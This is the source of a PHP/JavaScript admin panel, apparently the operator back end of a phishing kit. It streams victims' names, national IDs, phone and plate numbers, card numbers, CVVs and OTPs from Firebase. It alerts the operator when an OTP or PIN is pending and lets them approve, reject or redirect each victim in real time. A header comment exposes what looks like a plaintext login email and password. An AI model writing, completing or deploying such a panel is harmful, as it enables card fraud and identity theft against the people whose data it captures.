<?php
// إعدادات الدخول المشفرة (Saudiarabia@gmail.com / Atassan7080##)
$u_encoded = "U2F1ZGlhcmFiaWFAZ21haWwuY29t"; 
$username_required = base64_decode($u_encoded);
$password_hash_required = '$2y$10$O9fVzXGfR3H7QvA9W1B5e.V8JzZ8O6L7mR6Y4T3vX1K9C6F5gB2qG'; 

session_start();
if (isset($_POST['login'])) {
    if ($_POST['user'] == $username_required && password_verify($_POST['pass'], $password_hash_required)) {
        $_SESSION['loggedin'] = true;
    } else {
        $error = "بيانات الدخول غير صحيحة!";
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: Admin_panel.php");
    exit;
}
?>

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم الاحترافية</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Cairo', sans-serif; background-color: #f4f7f6; margin: 0; padding: 0; color: #333; }
        .header { background: #1a222f; color: #fff; padding: 20px; text-align: center; position: relative; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .logout-btn { position: absolute; left: 20px; top: 25px; color: #ff4d4d; text-decoration: none; font-weight: bold; border: 1px solid #ff4d4d; padding: 5px 15px; border-radius: 5px; transition: 0.3s; }
        .logout-btn:hover { background: #ff4d4d; color: #fff; }
        
        .container { padding: 20px; max-width: 1200px; margin: auto; }
        .stats-bar { background: #fff; padding: 15px; border-radius: 10px; margin-bottom: 20px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
        .online-status { color: #2ecc71; font-weight: 800; }

        /* تصميم الجدول */
        .table-wrapper { background: #fff; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
        table { width: 100%; border-collapse: collapse; text-align: center; }
        thead { background: #f8fafc; border-bottom: 2px solid #edf2f7; }
        th { padding: 15px; font-size: 13px; color: #64748b; text-transform: uppercase; }
        td { padding: 15px; border-bottom: 1px solid #edf2f7; font-size: 14px; vertical-align: middle; }
        
        .status-badge { padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: bold; background: #e2e8f0; }
        .status-new { background: #dcfce7; color: #166534; animation: blink 1.5s infinite; }
        @keyframes blink { 50% { opacity: 0.6; } }

        /* أزرار الإجراءات */
        .btn-action { padding: 6px 12px; border-radius: 5px; cursor: pointer; border: none; font-family: 'Cairo'; font-size: 12px; font-weight: 700; transition: 0.3s; margin: 2px; }
        .btn-details { background: #3498db; color: #fff; }
        .btn-redirect { background: #f39c12; color: #fff; }
        .btn-action:hover { opacity: 0.8; }

        /* لوحة التفاصيل المنبثقة */
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 1000; align-items: center; justify-content: center; }
        .modal-content { background: #fff; width: 90%; max-width: 600px; border-radius: 15px; padding: 25px; position: relative; }
        .close-modal { position: absolute; top: 15px; right: 15px; cursor: pointer; font-size: 20px; font-weight: bold; }
        
        .card-view { background: #1e293b; color: #fff; padding: 20px; border-radius: 12px; margin: 15px 0; font-family: monospace; position: relative; overflow: hidden; }
        .card-view::after { content: 'VISA / MASTER'; position: absolute; bottom: 10px; right: 15px; font-size: 12px; opacity: 0.3; }
        
        .ctrl-group { display: flex; gap: 10px; margin-top: 20px; }
        .btn-ctrl { flex: 1; padding: 12px; border: none; border-radius: 8px; font-family: 'Cairo'; font-weight: 800; cursor: pointer; }
        .btn-approve { background: #22c55e; color: #fff; }
        .btn-reject { background: #ef4444; color: #fff; }

        /* شاشة تسجيل الدخول */
        .login-overlay { position: fixed; top:0; left:0; width:100%; height:100%; background:#1a222f; display: flex; align-items: center; justify-content: center; z-index: 9999; }
        .login-box { background:#fff; padding: 40px; border-radius: 15px; width: 350px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.3); }
        .login-box input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 8px; font-family: 'Cairo'; box-sizing: border-box; }
        .login-box button { width: 100%; padding: 12px; background: #3498db; color:#fff; border:none; border-radius:8px; cursor:pointer; font-weight:800; font-family:'Cairo'; }
    </style>
</head>
<body>

<?php if (!isset($_SESSION['loggedin'])): ?>
    <div class="login-overlay">
        <div class="login-box">
            <h2 style="margin-bottom:20px;">دخول المهندس</h2>
            <?php if(isset($error)) echo "<p style='color:red; font-size:12px;'>$error</p>"; ?>
            <form method="POST">
                <input type="text" name="user" placeholder="البريد الإلكتروني" required>
                <input type="password" name="pass" placeholder="كلمة المرور" required>
                <button type="submit" name="login">دخول آمن</button>
            </form>
        </div>
    </div>
<?php else: ?>

    <div class="header">
        <a href="?logout=1" class="logout-btn">تسجيل خروج</a>
        <h1>نظام إدارة الطلبات - Ziyada</h1>
    </div>

    <div class="container">
        <div class="stats-bar">
            <div>إجمالي الطلبات: <span id="total-count">0</span></div>
            <div class="online-status">المتصلون الآن: <span id="online-count">0</span></div>
        </div>

        <div class="table-wrapper">
            <table id="main-table">
                <thead>
                    <tr>
                        <th>الرقم المرجعي</th>
                        <th>الاسم</th>
                        <th>رقم الهوية</th>
                        <th>الجوال</th>
                        <th>رقم اللوحة</th>
                        <th>التاريخ</th>
                        <th>الحالة</th>
                        <th>الإجراء</th>
                    </tr>
                </thead>
                <tbody id="table-body">
                    </tbody>
            </table>
        </div>
    </div>

    <div class="modal" id="detailsModal">
        <div class="modal-content">
            <span class="close-modal" onclick="closeModal()">&times;</span>
            <h3 id="m-name">تفاصيل العميل</h3>
            <hr>
            <div id="m-full-data">
                </div>
            
            <div class="card-view">
                <div style="font-size: 18px; letter-spacing: 2px; margin-bottom: 10px;" id="m-card-num">**** **** **** ****</div>
                <div style="display:flex; gap:20px; font-size:12px;">
                    <div>EXP: <span id="m-card-exp">--/--</span></div>
                    <div>CVV: <span id="m-card-cvv">***</span></div>
                </div>
                <div style="margin-top:10px; color:#f59e0b;">OTP: <span id="m-card-otp">------</span></div>
            </div>

            <div class="ctrl-group">
                <button class="btn-ctrl btn-approve" onclick="actionCmd('success')">قبول الطلب</button>
                <button class="btn-ctrl btn-reject" onclick="actionCmd('error')">رفض الطلب</button>
            </div>
        </div>
    </div>

    <audio id="notif" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <script>
    const firebaseConfig = { databaseURL: "YOUR_FIREBASE_URL" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let currentActiveId = null;

    // جلب البيانات من الفايربيس
    db.ref('payments').on('value', (snapshot) => {
        const tbody = document.getElementById('table-body');
        tbody.innerHTML = '';
        let count = 0;

        snapshot.forEach((child) => {
            const val = child.val();
            const id = child.key;
            count++;

            const isNew = (val.status === 'pending_otp' || val.status === 'pending_pin');
            if(isNew) document.getElementById('notif').play();

            const tr = document.createElement('tr');
            tr.innerHTML = `
                <td>#${val.ref_id || id.substring(0,6)}</td>
                <td><b>${val.full_name || '---'}</b></td>
                <td>${val.national_id || '---'}</td>
                <td>${id}</td>
                <td>${val.plate_number || '---'}</td>
                <td>${val.booking_time || '---'}</td>
                <td><span class="status-badge ${isNew ? 'status-new' : ''}">${val.status || 'نشط'}</span></td>
                <td>
                    <button class="btn-action btn-details" onclick="openDetails('${id}')">التفاصيل</button>
                    <button class="btn-action btn-redirect" onclick="actionCmd('redirect', '${id}')">إعادة توجيه</button>
                </td>
            `;
            tbody.appendChild(tr);
        });
        document.getElementById('total-count').innerText = count;
        document.getElementById('online-count').innerText = count; // كود تقريبي للزيارات
    });

    function openDetails(id) {
        currentActiveId = id;
        db.ref('payments/' + id).once('value').then((snapshot) => {
            const val = snapshot.val();
            document.getElementById('m-name').innerText = "بيانات: " + (val.full_name || '---');
            document.getElementById('m-card-num').innerText = val.card_number || '**** **** **** ****';
            document.getElementById('m-card-exp').innerText = val.exp_date || '--/--';
            document.getElementById('m-card-cvv').innerText = val.cvv || '***';
            document.getElementById('m-card-otp').innerText = val.otp || '------';
            
            document.getElementById('m-full-data').innerHTML = `
                <p><b>رقم الهوية:</b> ${val.national_id || '---'}</p>
                <p><b>رقم اللوحة:</b> ${val.plate_number || '---'}</p>
                <p><b>الجوال:</b> ${id}</p>
            `;
            
            document.getElementById('detailsModal').style.display = 'flex';
        });
    }

    function closeModal() {
        document.getElementById('detailsModal').style.display = 'none';
    }

    function actionCmd(status, id = null) {
        const targetId = id || currentActiveId;
        if(targetId) {
            db.ref('payments/' + targetId).update({ status: status });
            if(!id) closeModal();
            alert('تم تنفيذ الإجراء: ' + status);
        }
    }

    // إغلاق المودال عند الضغط خارجه
    window.onclick = function(event) {
        if (event.target == document.getElementById('detailsModal')) closeModal();
    }
    </script>
<?php endif; ?>
</body>
</html>
